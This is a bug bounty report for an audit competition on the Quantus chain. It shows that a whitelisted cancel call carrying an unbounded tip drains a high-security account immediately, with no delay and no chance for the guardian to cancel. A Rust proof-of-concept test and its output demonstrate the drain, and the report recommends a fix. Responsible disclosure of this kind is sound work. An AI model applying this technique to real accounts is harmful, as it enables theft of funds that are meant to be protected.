# 89347 bc critical high security accounts can be drained immediately via an unbounded tip on a whitelisted call

**Submitted on Aug 18th 2026 at 18:10:47 UTC by @Tradi3 for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89347
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Direct loss of funds

## Description

**Commit:** `3b243b870a5442a6e5f443056f67bbba87d472f5` (`audit-comp-ready`)

## Brief / Intro

A high-security account is supposed to be unable to move funds immediately. Transfers are delayed and a guardian can cancel them. The runtime enforces this on the *call* only. It never looks at the *tip*.

A signed extrinsic carrying a whitelisted call and a large tip drains the account's free balance to the existential deposit in that same extrinsic. There is no delay, no pending transfer, and nothing for the guardian to cancel.

## Vulnerability Details

`ReversibleTransactionExtension` sits before `ChargeTransactionPayment` in `TxExtension` (`runtime/src/lib.rs`). Its `validate` only checks the call:

```
if !crate::configs::HighSecurityConfig::is_call_allowed(&who, call) {
    return Err(TransactionValidityError::Invalid(InvalidTransaction::Custom(1)));
}
```

`is_call_allowed` is `!is_high_security || is_whitelisted(call)` (`primitives/high-security/src/lib.rs`). The tip is not a parameter of that check, and `pallet_reversible_transfers` never inspects tips anywhere else.

`cancel` is listed in `is_whitelisted` (`runtime/src/configs/mod.rs`), so it passes the gate. `ChargeTransactionPayment` then computes the fee from the signed tip and withdraws it at pre-dispatch, before the call runs. There is no tip cap in the runtime.

Because the charge happens before dispatch, the call does not have to succeed. A `cancel` of a nonexistent `tx_id` is enough. Nothing is scheduled, so `PendingTransfersBySender` stays empty and the guardian has nothing to act on. The withdrawn amount is queued in `CollectedFees` and minted to the block author.

A direct `Balances` transfer from the same account is still rejected by the gate. That is the point: the whitelist works, but it does not cover the tip field.

This is the threat model the feature documents for itself. `pallets/reversible-transfers/README.md` states:

> An attacker who compromises account keys cannot disable protections to steal funds immediately\
> Users cannot be tricked into disabling security during a scam

Both claims fail when the signed extrinsic is a whitelisted call with a large tip. High-security mode cannot be switched off, and the documented way out is a delayed `schedule_transfer`; this path skips that delay entirely.

## Impact Details

The high-security account's free balance is taken immediately, in one extrinsic. `recover_funds` cannot unwind a tip that has already gone to `CollectedFees`.

If the submitter also authors the block, `pallets/mining-rewards/src/lib.rs` mints that amount to the block author, so the attacker recovers the drained value. If they do not author the block, the funds are still gone from the victim.

The signed origin is the high-security account itself. The attack requires no pending transfer, no guardian signature, and no privileged role.

## Recommendation

Reject a non-zero tip for high-security origins in `ReversibleTransactionExtension`, or charge tips through the same delayed, cancellable path used for transfers.

Add a regression test asserting that a whitelisted `cancel` carrying a large tip cannot reduce a high-security account's free balance outside the delayed-transfer rules.

## References

* `runtime/src/lib.rs` — `TxExtension` ordering
* `runtime/src/configs/mod.rs` — `is_whitelisted`
* `primitives/high-security/src/lib.rs` — `is_call_allowed`
* `pallets/reversible-transfers/README.md` — stated guarantees
* `pallets/mining-rewards/src/lib.rs` — `CollectedFees` payout to block author

## Proof of Concept

{% stepper %}
{% step %}

### Save the test

Save the test below as `runtime/tests/hs_tip_drain_poc.rs` in `audit-comp-quantus-chain` at commit `3b243b870a5442a6e5f443056f67bbba87d472f5`.
{% endstep %}

{% step %}

### Run the test

```bash
cargo test -p quantus-runtime --test hs_tip_drain_poc -- --nocapture
```

{% endstep %}

{% step %}

### Observed output

```
victim free balance before      : 100000000000
control: direct transfer BLOCKED by high-security whitelist
attack : whitelisted cancel ALLOWED by high-security whitelist
inclusion fee (no tip)          : 1028157000
attacker-chosen tip             : 97971843000
victim free balance after       : 1000000000
value removed                   : 99000000000
CollectedFees after             : 99000000000

test result: ok. 2 passed
```

{% endstep %}

{% step %}

### Test source

```rust
use frame_support::dispatch::GetDispatchInfo;
use pallet_transaction_payment::ChargeTransactionPayment;
use quantus_runtime::{
	transaction_extensions::ReversibleTransactionExtension, Balances, ReversibleTransfers, Runtime,
	RuntimeCall, RuntimeOrigin, EXISTENTIAL_DEPOSIT,
};
use sp_runtime::{
	traits::{TransactionExtension, TxBaseImplication},
	AccountId32, BuildStorage, MultiAddress,
};

fn victim() -> AccountId32 {
	AccountId32::from([3u8; 32])
}
fn guardian() -> AccountId32 {
	AccountId32::from([1u8; 32])
}
fn outsider() -> AccountId32 {
	AccountId32::from([2u8; 32])
}

fn new_test_ext() -> sp_io::TestExternalities {
	let mut t = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();

	pallet_balances::GenesisConfig::<Runtime> {
		balances: vec![
			(guardian(), EXISTENTIAL_DEPOSIT * 10_000),
			(outsider(), EXISTENTIAL_DEPOSIT * 2),
			(victim(), EXISTENTIAL_DEPOSIT * 100),
		],
		dev_accounts: None,
	}
	.assimilate_storage(&mut t)
	.unwrap();

	pallet_reversible_transfers::GenesisConfig::<Runtime> {
		initial_high_security_accounts: vec![(victim(), guardian(), 10)],
	}
	.assimilate_storage(&mut t)
	.unwrap();

	pallet_treasury::GenesisConfig::<Runtime> {
		treasury_account: Some(AccountId32::from([9u8; 32])),
		treasury_portion: Some(sp_runtime::Permill::from_percent(50)),
	}
	.assimilate_storage(&mut t)
	.unwrap();

	sp_io::TestExternalities::new(t)
}

fn hs_gate(
	call: &RuntimeCall,
) -> Result<(), sp_runtime::transaction_validity::TransactionValidityError> {
	ReversibleTransactionExtension::<Runtime>::new()
		.validate(
			RuntimeOrigin::signed(victim()),
			call,
			&Default::default(),
			0,
			(),
			&TxBaseImplication::<()>(()),
			frame_support::pallet_prelude::TransactionSource::External,
		)
		.map(|_| ())
}

#[test]
fn high_security_tip_drains_free_balance_bypassing_delay_and_guardian() {
	new_test_ext().execute_with(|| {
		assert!(ReversibleTransfers::is_high_security(&victim()).is_some());

		let free_before = Balances::free_balance(victim());
		let guardian_before = Balances::free_balance(guardian());

		let direct = RuntimeCall::Balances(pallet_balances::Call::transfer_allow_death {
			dest: MultiAddress::Id(outsider()),
			value: free_before / 2,
		});
		assert!(hs_gate(&direct).is_err());

		let call = RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::cancel {
			tx_id: sp_core::H256::default(),
		});
		assert!(hs_gate(&call).is_ok());

		let info = call.get_dispatch_info();
		let len = 0usize;
		let fee_no_tip =
			pallet_transaction_payment::Pallet::<Runtime>::compute_fee(len as u32, &info, 0u128);
		let tip = free_before
			.saturating_sub(EXISTENTIAL_DEPOSIT)
			.saturating_sub(fee_no_tip);

		let ext = ChargeTransactionPayment::<Runtime>::from(tip);
		let (_valid, val, origin) = ext
			.validate(
				RuntimeOrigin::signed(victim()),
				&call,
				&info,
				len,
				(),
				&TxBaseImplication::<()>(()),
				frame_support::pallet_prelude::TransactionSource::External,
			)
			.expect("unbounded tip accepted");

		let _pre = ChargeTransactionPayment::<Runtime>::from(tip)
			.prepare(val, &origin, &call, &info, len)
			.expect("fee + tip withdrawal");

		let free_after = Balances::free_balance(victim());
		assert!(free_before - free_after >= tip);
		assert_eq!(free_after, EXISTENTIAL_DEPOSIT);
		assert!(
			pallet_reversible_transfers::PendingTransfersBySender::<Runtime>::get(victim())
				.is_empty()
		);
		assert_eq!(Balances::free_balance(guardian()), guardian_before);
	});
}

#[test]
fn tip_is_accumulated_for_payout_to_the_block_author() {
	new_test_ext().execute_with(|| {
		let call = RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::cancel {
			tx_id: sp_core::H256::default(),
		});
		let info = call.get_dispatch_info();
		let len = 0usize;
		let fee_no_tip =
			pallet_transaction_payment::Pallet::<Runtime>::compute_fee(len as u32, &info, 0u128);
		let tip = Balances::free_balance(victim())
			.saturating_sub(EXISTENTIAL_DEPOSIT)
			.saturating_sub(fee_no_tip);

		let collected_before = pallet_mining_rewards::Pallet::<Runtime>::collected_fees();

		let ext = ChargeTransactionPayment::<Runtime>::from(tip);
		let (_v, val, origin) = ext
			.validate(
				RuntimeOrigin::signed(victim()),
				&call,
				&info,
				len,
				(),
				&TxBaseImplication::<()>(()),
				frame_support::pallet_prelude::TransactionSource::External,
			)
			.unwrap();
		let pre = ChargeTransactionPayment::<Runtime>::from(tip)
			.prepare(val, &origin, &call, &info, len)
			.unwrap();

		let post_info = frame_support::dispatch::PostDispatchInfo {
			actual_weight: None,
			pays_fee: frame_support::dispatch::Pays::Yes,
		};
		<ChargeTransactionPayment<Runtime> as TransactionExtension<RuntimeCall>>::post_dispatch_details(
			pre, &info, &post_info, len, &Ok(()),
		)
		.unwrap();

		let collected_after = pallet_mining_rewards::Pallet::<Runtime>::collected_fees();
		assert!(collected_after >= tip);
	});
}
```

{% endstep %}
{% endstepper %}
